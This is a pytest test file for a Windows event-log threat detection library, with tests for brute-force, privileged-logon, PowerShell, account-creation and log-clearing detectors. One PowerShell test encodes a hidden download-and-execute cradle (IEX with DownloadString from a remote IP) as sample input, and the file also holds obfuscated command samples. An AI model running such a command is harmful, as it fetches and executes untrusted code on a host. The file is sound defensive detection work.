from datetime import timedelta

import pytest

from eventhunter import mitre
from eventhunter.detectors import (
    AccountCreationDetector,
    BruteForceDetector,
    DetectorConfig,
    LogClearedDetector,
    PrivilegeEscalationDetector,
    SuspiciousPowerShellDetector,
)
from eventhunter.detectors.brute_force import find_bursts
from eventhunter.detectors.powershell import decode_encoded_command, score_command_line
from eventhunter.engine import run_detectors
from eventhunter.models import Severity

from conftest import encode_ps, make_event


def failed(user, seconds, ip="203.0.113.50", **extra):
    return make_event(
        4625, seconds, TargetUserName=user, TargetDomainName="CORP", IpAddress=ip,
        LogonType="3", SubStatus="0xC000006A", **extra,
    )


# --- Brute force ---------------------------------------------------------------

class TestBruteForce:
    def test_burst_over_threshold_is_detected(self):
        events = [failed("alice", i * 10) for i in range(6)]
        [d] = BruteForceDetector().detect(events)
        assert d.severity is Severity.HIGH
        assert d.techniques == [mitre.PASSWORD_GUESSING]
        assert d.details["Failed attempts"] == "6"
        assert d.details["Failure reason(s)"] == "wrong password"
        assert d.details["Logon type(s)"] == "Network"
        assert "203.0.113.50" in d.summary

    def test_below_threshold_is_ignored(self):
        events = [failed("alice", i * 10) for i in range(4)]
        assert BruteForceDetector().detect(events) == []

    def test_failures_spread_beyond_window_are_ignored(self):
        # 6 failures, one every 2 minutes -> never 5 inside a 5-minute window.
        events = [failed("alice", i * 120) for i in range(6)]
        assert BruteForceDetector().detect(events) == []

    def test_different_accounts_are_not_combined(self):
        events = [failed(f"user{i}", i) for i in range(10)]
        assert BruteForceDetector().detect(events) == []

    def test_successful_logon_after_burst_escalates_to_critical(self):
        events = [failed("alice", i) for i in range(5)]
        events.append(make_event(4624, 30, TargetUserName="alice", IpAddress="203.0.113.50"))
        [d] = BruteForceDetector().detect(events)
        assert d.severity is Severity.CRITICAL
        assert "Successful logon" in d.details
        assert len(d.events) == 6

    def test_success_long_after_burst_does_not_escalate(self):
        events = [failed("alice", i) for i in range(5)]
        events.append(make_event(4624, 3600, TargetUserName="alice"))
        [d] = BruteForceDetector().detect(events)
        assert d.severity is Severity.HIGH

    def test_two_separate_bursts_produce_two_findings(self):
        events = [failed("alice", i) for i in range(5)] + [failed("alice", 7200 + i) for i in range(5)]
        assert len(BruteForceDetector().detect(events)) == 2

    def test_custom_threshold_and_window(self):
        config = DetectorConfig(brute_force_threshold=3, brute_force_window=10)
        events = [failed("alice", i * 4) for i in range(3)]
        assert len(BruteForceDetector(config).detect(events)) == 1

    def test_ignored_account(self):
        config = DetectorConfig(ignore_accounts={"Scanner_Svc"})
        events = [failed("scanner_svc", i) for i in range(20)]
        assert BruteForceDetector(config).detect(events) == []

    def test_find_bursts_merges_overlapping_windows(self):
        events = [failed("a", i * 30) for i in range(20)]  # steady stream, 10 min long
        bursts = find_bursts(events, threshold=5, window=timedelta(seconds=300))
        assert len(bursts) == 1 and len(bursts[0]) == 20


# --- Privileged logon ------------------------------------------------------------

def special(user, seconds=0, privileges="SeDebugPrivilege\n\t\tSeBackupPrivilege", logon_id="0x1"):
    return make_event(
        4672, seconds, SubjectUserName=user, SubjectDomainName="CORP",
        PrivilegeList=privileges, SubjectLogonId=logon_id,
    )


class TestPrivilege:
    @pytest.mark.parametrize("account", ["SYSTEM", "LOCAL SERVICE", "WS01$", "DWM-1", "UMFD-0"])
    def test_system_accounts_are_filtered(self, account):
        assert PrivilegeEscalationDetector().detect([special(account)]) == []

    def test_events_aggregated_per_account(self):
        events = [special("bob", i, logon_id=hex(i)) for i in range(3)] + [special("carol")]
        detections = PrivilegeEscalationDetector().detect(events)
        assert len(detections) == 2
        bob = next(d for d in detections if "bob" in d.summary)
        assert bob.details["Privileged logons"] == "3"
        assert bob.details["Distinct logon sessions"] == "3"
        assert bob.severity is Severity.MEDIUM
        assert "SeDebugPrivilege" in bob.details["Sensitive privileges"]
        assert bob.techniques == [mitre.VALID_ACCOUNTS]

    def test_non_sensitive_privileges_are_low(self):
        [d] = PrivilegeEscalationDetector().detect([special("bob", privileges="SeSecurityPrivilege")])
        assert d.severity is Severity.LOW

    def test_newly_created_account_using_privileges_is_high(self):
        created = make_event(4720, 0, TargetUserName="backdoor", SubjectUserName="alice")
        [d] = PrivilegeEscalationDetector().detect([created, special("backdoor", 60)])
        assert d.severity is Severity.HIGH
        assert "Account created" in d.details


# --- PowerShell ---------------------------------------------------------------------

def proc(command_line, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"):
    return make_event(
        4688, NewProcessName=image, CommandLine=command_line,
        SubjectUserName="alice", SubjectDomainName="CORP",
        ParentProcessName=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    )


class TestPowerShell:
    @pytest.mark.parametrize("flag", ["-e", "-ec", "-enc", "-EncodedCommand", "/enc", "\u2013enc", "-ENCODEDC"])
    def test_encoded_flag_variants(self, flag):
        cmd = f"powershell.exe {flag} {encode_ps('Write-Host hi')}"
        score, hits, decoded = score_command_line(cmd)
        assert "Encoded command (-EncodedCommand)" in hits
        assert decoded == "Write-Host hi"

    @pytest.mark.parametrize("cmd", ["powershell -ExecutionPolicy Bypass -File x.ps1", "powershell -ep bypass"])
    def test_execution_policy_is_not_mistaken_for_encoded(self, cmd):
        _, hits, _ = score_command_line(cmd)
        assert "Encoded command (-EncodedCommand)" not in hits
        assert "Execution policy bypass" in hits

    def test_full_attack_command_is_critical_and_decoded(self):
        payload = encode_ps("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')")
        [d] = SuspiciousPowerShellDetector().detect([proc(f"powershell.exe -nop -w hidden -enc {payload}")])
        assert d.severity is Severity.CRITICAL
        assert "DownloadString" in d.details["Decoded payload"]
        assert "Download cradle (decoded)" in d.details["Indicators"]
        assert d.techniques == [mitre.POWERSHELL, mitre.COMMAND_OBFUSCATION]

    def test_encoded_command_alone_is_high(self):
        [d] = SuspiciousPowerShellDetector().detect([proc(f"powershell -enc {encode_ps('Get-Date')}")])
        assert d.severity is Severity.HIGH

    def test_benign_powershell_is_ignored(self):
        assert SuspiciousPowerShellDetector().detect([proc("powershell.exe -NoProfile -File C:\\scripts\\backup.ps1")]) == []

    def test_non_powershell_process_is_ignored(self):
        event = proc("notepad.exe -enc AAAAAAAAAAAA", image=r"C:\Windows\notepad.exe")
        assert SuspiciousPowerShellDetector().detect([event]) == []

    def test_powershell_launched_via_cmd_is_detected(self):
        event = proc(f"cmd.exe /c powershell -enc {encode_ps('whoami')}", image=r"C:\Windows\System32\cmd.exe")
        assert len(SuspiciousPowerShellDetector().detect([event])) == 1

    def test_caret_obfuscation(self):
        _, hits, _ = score_command_line("p^o^w^e^r^s^h^e^l^l -c whoami")
        assert "Character-level obfuscation" in hits

    def test_decode_rejects_garbage(self):
        assert decode_encoded_command("!!!notbase64!!!") is None


# --- Account creation / log cleared ------------------------------------------------------

class TestAccountCreation:
    def test_local_account(self):
        e = make_event(4720, TargetUserName="svc_backup", TargetDomainName="WS01", SubjectUserName="alice")
        [d] = AccountCreationDetector().detect([e])
        assert d.severity is Severity.HIGH
        assert d.techniques == [mitre.CREATE_LOCAL_ACCOUNT]

    def test_domain_account(self):
        e = make_event(4720, TargetUserName="jdoe", TargetDomainName="CORP", SubjectUserName="alice")
        [d] = AccountCreationDetector().detect([e])
        assert d.techniques == [mitre.CREATE_DOMAIN_ACCOUNT]

    def test_dollar_sign_user_account_is_critical(self):
        e = make_event(4720, TargetUserName="WS99$", TargetDomainName="CORP", SubjectUserName="alice")
        [d] = AccountCreationDetector().detect([e])
        assert d.severity is Severity.CRITICAL


class TestLogCleared:
    def test_log_cleared_is_critical(self):
        e = make_event(1102, SubjectUserName="alice", SubjectDomainName="CORP")
        [d] = LogClearedDetector().detect([e])
        assert d.severity is Severity.CRITICAL
        assert d.techniques == [mitre.CLEAR_WINDOWS_EVENT_LOGS]
        assert "CORP\\alice" in d.summary


# --- Engine ---------------------------------------------------------------------------

def test_engine_ignores_same_event_id_from_other_provider():
    # Event IDs are only unique per provider; 1102 from another source is not a log wipe.
    from dataclasses import replace

    unrelated = replace(make_event(1102), provider="SomeVendor-Agent")
    assert run_detectors([unrelated]) == []


def test_engine_sorts_by_severity_then_time_and_filters():
    events = [
        make_event(4720, 10, TargetUserName="x", TargetDomainName="CORP"),
        make_event(1102, 20, SubjectUserName="alice"),
        special("bob", 5, privileges="SeSecurityPrivilege"),
    ]
    detections = run_detectors(events)
    assert [d.severity for d in detections] == [Severity.CRITICAL, Severity.HIGH, Severity.LOW]
    assert len(run_detectors(events, min_severity=Severity.HIGH)) == 2
